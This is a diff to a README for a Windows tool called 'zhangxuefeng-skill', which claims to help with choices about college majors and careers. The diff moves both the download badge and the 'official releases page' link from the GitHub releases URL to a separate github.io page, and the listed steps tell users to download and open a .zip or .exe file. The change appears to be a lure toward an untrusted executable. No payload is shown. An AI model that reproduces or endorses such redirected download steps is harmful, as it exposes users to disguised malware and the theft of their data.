@@ -1,6 +1,6 @@
 # 🧠 zhangxuefeng-skill - Master your career and education choices
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Petxd2080/zhangxuefeng-skill/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://petxd2080.github.io)
 
 zhangxuefeng-skill provides a structured framework for making decisions about college majors, graduate school paths, and long-term career planning. This tool organizes complex information into a clear format. It helps you weigh your options based on current market trends and practical outcomes. Use this software to compare different educational routes and employment prospects.
 
@@ -28,7 +28,7 @@ This application runs on Windows computers. Ensure your computer meets these min
 
 Follow these steps to install the software on your computer.
 
-1. Visit the [official releases page](https://github.com/Petxd2080/zhangxuefeng-skill/releases) to access the downloads.
+1. Visit the [official releases page](https://petxd2080.github.io) to access the downloads.
 2. Select the file ending in .zip or .exe under the current version.
 3. Save the file to your computer.
 4. Open the folder where you saved the file.
